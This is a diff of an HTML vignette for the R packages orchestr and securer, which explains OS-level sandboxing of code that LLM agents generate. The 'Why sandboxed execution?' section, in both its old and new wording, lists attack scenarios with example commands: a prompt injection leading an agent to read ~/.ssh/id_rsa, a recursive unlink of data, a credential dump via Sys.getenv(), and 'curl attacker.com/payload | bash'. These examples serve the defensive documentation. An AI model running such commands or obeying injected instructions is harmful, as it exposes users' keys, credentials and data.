@@ -61,29 +61,25 @@
     
     
 <div class="section level2">
-<h2 id="why-sandboxed-execution">Why Sandboxed Execution?<a class="anchor" aria-label="anchor" href="#why-sandboxed-execution"></a>
+<h2 id="why-sandboxed-execution">Why sandboxed execution?<a class="anchor" aria-label="anchor" href="#why-sandboxed-execution"></a>
 </h2>
-<p>When an LLM agent generates and executes R code, it is running
-arbitrary code on your machine. This is fundamentally different from a
-human writing code in an interactive session, because the human applies
-judgment about what is safe to run. The model does not have that
-judgment – and worse, it can be manipulated.</p>
-<p>Consider these concrete attack scenarios:</p>
+<p>When an LLM agent generates and executes R code, it runs arbitrary
+code on your machine. A human applies judgment about what is safe to
+run. The model does not, and worse, it can be manipulated.</p>
+<p>Consider these attack scenarios:</p>
 <ul>
-<li><p><strong>Data exfiltration</strong>: A prompt injection in a
-user-uploaded CSV causes the agent to run
-<code>readLines("~/.ssh/id_rsa")</code> and include the contents in its
-response. The user’s private key is now in the LLM provider’s
-logs.</p></li>
-<li><p><strong>Filesystem destruction</strong>: The agent encounters an
-error and decides to “clean up” by running
+<li><p>Data exfiltration: A prompt injection in a user-uploaded CSV
+causes the agent to run <code>readLines("~/.ssh/id_rsa")</code> and
+include the contents in its response. The user’s private key is now in
+the LLM provider’s logs.</p></li>
+<li><p>Filesystem destruction: The agent encounters an error and decides
+to “clean up” by running
 <code>unlink("/data/reports", recursive = TRUE)</code>. A momentary
 hallucination just deleted your production data.</p></li>
-<li><p><strong>Credential theft</strong>: The model runs
-<code><a href="https://rdrr.io/r/base/Sys.getenv.html" class="external-link">Sys.getenv()</a></code> to “debug” a connection issue, exposing every
-environment variable – API keys, database passwords, cloud credentials –
-in its output.</p></li>
-<li><p><strong>Lateral movement</strong>: The agent calls
+<li><p>Credential theft: The model runs <code><a href="https://rdrr.io/r/base/Sys.getenv.html" class="external-link">Sys.getenv()</a></code> to
+“debug” a connection issue, exposing every environment variable (API
+keys, database passwords, cloud credentials) in its output.</p></li>
+<li><p>Lateral movement: The agent calls
 <code>system("curl attacker.com/payload | bash")</code> to install a
 “helpful package” that a prompt injection suggested.</p></li>
 </ul>
@@ -93,8 +89,8 @@ provides OS-level sandboxing so that generated code cannot access the
 filesystem, network, or system resources beyond what you explicitly
 allow.</p>
 <p>orchestr integrates with securer through the
-<code>secure = TRUE</code> flag on <code><a href="../reference/Agent.html">agent()</a></code>. The interaction
-between orchestr and securer looks like this:</p>
+<code>secure = TRUE</code> flag on <code><a href="../reference/Agent.html">agent()</a></code>. Here is how
+orchestr and securer interact:</p>
 <pre><code> +------------------+       tool call       +------------------+
  |    orchestr      | -------------------&gt; |     securer       |
  |  (agent graph)   |                      |  (sandbox child)  |
@@ -118,11 +114,11 @@ the OS blocks it.</p>
 <code class="sourceCode R"><span><span class="fu"><a href="https://rdrr.io/r/utils/install.packages.html" class="external-link">install.packages</a></span><span class="op">(</span><span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"securer"</span>, <span class="st">"orchestr"</span><span class="op">)</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level2">
-<h2 id="creating-a-secure-agent">Creating a Secure Agent<a class="anchor" aria-label="anchor" href="#creating-a-secure-agent"></a>
+<h2 id="creating-a-secure-agent">Creating a secure agent<a class="anchor" aria-label="anchor" href="#creating-a-secure-agent"></a>
 </h2>
 <p>The <code>secure = TRUE</code> and <code>sandbox = TRUE</code> flags
 on <code><a href="../reference/Agent.html">agent()</a></code> tell orchestr to route tool execution through a
-securer <code>SecureSession</code>. You define tools as usual – the
+securer <code>SecureSession</code>. You define tools as usual; the
 sandboxing is transparent to the tool implementation.</p>
 <div class="sourceCode" id="cb3"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ian-flores.github.io/orchestr/">orchestr</a></span><span class="op">)</span></span>
@@ -161,42 +157,36 @@ sandboxing is transparent to the tool implementation.</p>
 <span><span class="va">secure_agent</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level2">
-<h2 id="what-the-sandbox-restricts">What the Sandbox Restricts<a class="anchor" aria-label="anchor" href="#what-the-sandbox-restricts"></a>
+<h2 id="what-the-sandbox-restricts">What the sandbox restricts<a class="anchor" aria-label="anchor" href="#what-the-sandbox-restricts"></a>
 </h2>
 <p>When <code>sandbox = TRUE</code>, the child R process runs inside an
 OS sandbox:</p>
 <ul>
-<li>
-<strong>macOS</strong>: Seatbelt profile via
-<code>sandbox-exec</code>. Blocks filesystem writes outside temp,
-network access, and process spawning.</li>
-<li>
-<strong>Linux</strong>: Bubblewrap (<code>bwrap</code>) namespace
-isolation. Blocks filesystem, network, and IPC outside the sandbox.</li>
-<li>
-<strong>Windows</strong>: Environment isolation (clean HOME, TMPDIR,
-R_LIBS_USER). No filesystem or network restrictions without admin
-privileges.</li>
+<li>macOS: Seatbelt profile via <code>sandbox-exec</code>. Blocks
+filesystem writes outside temp, network access, and process
+spawning.</li>
+<li>Linux: Bubblewrap (<code>bwrap</code>) namespace isolation. Blocks
+filesystem, network, and IPC outside the sandbox.</li>
+<li>Windows: Environment isolation (clean HOME, TMPDIR, R_LIBS_USER). No
+filesystem or network restrictions without admin privileges.</li>
 </ul>
-<p>The sandbox operates at the OS level, which means it catches
-everything – including <code><a href="https://rdrr.io/r/base/system.html" class="external-link">system()</a></code> calls, compiled code, and
-any R package that attempts forbidden operations. This is strictly
-stronger than R-level sandboxing approaches that rely on function
-blacklists, because it is enforced by the kernel.</p>
+<p>The sandbox operates at the OS level, catching <code><a href="https://rdrr.io/r/base/system.html" class="external-link">system()</a></code>
+calls, compiled code, and any R package that attempts forbidden
+operations. Kernel enforcement is strictly stronger than R-level
+sandboxing that relies on function blacklists.</p>
 </div>
 <div class="section level2">
-<h2 id="mixing-secure-and-regular-tools">Mixing Secure and Regular Tools<a class="anchor" aria-label="anchor" href="#mixing-secure-and-regular-tools"></a>
+<h2 id="mixing-secure-and-regular-tools">Mixing secure and regular tools<a class="anchor" aria-label="anchor" href="#mixing-secure-and-regular-tools"></a>
 </h2>
-<p>In practice, not every tool needs to run in a sandbox. An agent might
-need both a sandboxed code execution tool (untrusted, LLM-generated
-code) and a regular API lookup tool (trusted code that you wrote).
-orchestr supports this by distinguishing <code><a href="https://ian-flores.github.io/securer/reference/securer_tool.html" class="external-link">securer_tool()</a></code>
-instances from regular <code><a href="https://ellmer.tidyverse.org/reference/tool.html" class="external-link">ellmer::tool()</a></code> instances.</p>
-<p>When an agent has both types, securer tools are routed to the
-sandboxed child process while regular tools execute in the parent
-process. This gives you the best of both worlds: untrusted code is
-isolated, trusted code has full access to the network and
-filesystem.</p>
+<p>Not every tool needs a sandbox. An agent might need both a sandboxed
+code execution tool (untrusted, LLM-generated code) and a regular API
+lookup tool (trusted code that you wrote). orchestr tells
+<code><a href="https://ian-flores.github.io/securer/reference/securer_tool.html" class="external-link">securer_tool()</a></code> instances apart from regular
+<code><a href="https://ellmer.tidyverse.org/reference/tool.html" class="external-link">ellmer::tool()</a></code> instances.</p>
+<p>When an agent has both types, securer tools run in the sandboxed
+child process while regular tools execute in the parent process.
+Untrusted code stays isolated; trusted code keeps full access to the
+network and filesystem.</p>
 <div class="sourceCode" id="cb4"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="co"># Regular tool -- runs in the parent process, no sandbox</span></span>
 <span><span class="va">weather_tool</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/tool.html" class="external-link">tool</a></span><span class="op">(</span></span>
@@ -226,13 +216,12 @@ filesystem.</p>
 <span><span class="va">hybrid_agent</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level2">
-<h2 id="using-secure-agents-in-graphs">Using Secure Agents in Graphs<a class="anchor" aria-label="anchor" href="#using-secure-agents-in-graphs"></a>
+<h2 id="using-secure-agents-in-graphs">Using secure agents in graphs<a class="anchor" aria-label="anchor" href="#using-secure-agents-in-graphs"></a>
 </h2>
-<p>Secure agents work identically to regular agents inside any graph
-type. The sandboxing is handled at the tool execution layer, so the
-graph runtime does not need to know or care whether an agent is
-sandboxed. This means you can mix secure and non-secure agents in the
-same pipeline or supervisor graph.</p>
+<p>Secure agents work the same as regular agents inside any graph type.
+Sandboxing operates at the tool execution layer, so the graph runtime is
+unaware of it. You can mix secure and non-secure agents in the same
+pipeline or supervisor graph.</p>
 <div class="sourceCode" id="cb5"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">analyst</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/Agent.html">agent</a></span><span class="op">(</span><span class="st">"analyst"</span>,</span>
 <span>  chat <span class="op">=</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_anthropic.html" class="external-link">chat_anthropic</a></span><span class="op">(</span></span>
@@ -259,21 +248,21 @@ same pipeline or supervisor graph.</p>
 <span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level2">
-<h2 id="next-steps">Next Steps<a class="anchor" aria-label="anchor" href="#next-steps"></a>
+<h2 id="next-steps">Next steps<a class="anchor" aria-label="anchor" href="#next-steps"></a>
 </h2>
 <ul>
 <li>
-<strong><a href="quickstart.html">Getting Started</a></strong> –
-single-agent basics and provider setup</li>
+<a href="quickstart.html">Getting started</a>: single-agent basics
+and provider setup</li>
 <li>
-<strong><a href="multi-agent.html">Multi-Agent
-Workflows</a></strong> – pipelines and supervisors</li>
+<a href="multi-agent.html">Multi-agent workflows</a>: pipelines and
+supervisors</li>
 <li>
-<strong><a href="tracing.html">Traced Workflows</a></strong> –
-observability with securetrace</li>
+<a href="tracing.html">Traced workflows</a>: observability with
+securetrace</li>
 <li>
-<strong><a href="governed-agent.html">Governed Agent</a></strong> –
-the full 7-package stack</li>
+<a href="governed-agent.html">Governed agent</a>: the full 7-package
+stack</li>
 </ul>
 </div>
   </main><aside class="col-md-3"><nav id="toc" aria-label="Table of contents"><h2>On this page</h2>
